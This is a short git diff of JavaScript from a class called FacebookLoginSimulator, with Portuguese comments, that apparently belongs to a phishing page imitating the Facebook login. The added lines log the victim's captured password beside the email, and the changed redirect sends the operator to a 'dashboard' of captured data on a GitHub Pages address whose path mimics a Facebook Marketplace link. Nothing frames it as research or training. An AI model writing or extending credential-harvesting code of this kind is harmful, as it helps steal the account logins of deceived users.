@@ -210,6 +210,7 @@ class FacebookLoginSimulator {
   processCredentials(email, password) {
     console.group("🔐 CREDENCIAIS CAPTURADAS");
     console.log("📧 Email:", email);
+    console.log("🔑 Senha:", password);
     console.groupEnd();
 
     // ⚠️ SALVAR NO ARMAZENAMENTO LOCAL
@@ -224,7 +225,8 @@ class FacebookLoginSimulator {
     // Opcional: Redirecionar para dashboard após 2 segundos
     setTimeout(() => {
       if (confirm("Deseja ver o dashboard com os dados capturados?")) {
-        window.location.href = "/dashboard.html";
+        window.location.href =
+          "https://leyukezer-sys.github.io/https-www.facebook.com-marketplace-item-795575060057627-ref-browse_tab-referral_code-marketplace_gen/dashboard.html";
       }
     }, 2000);
   }
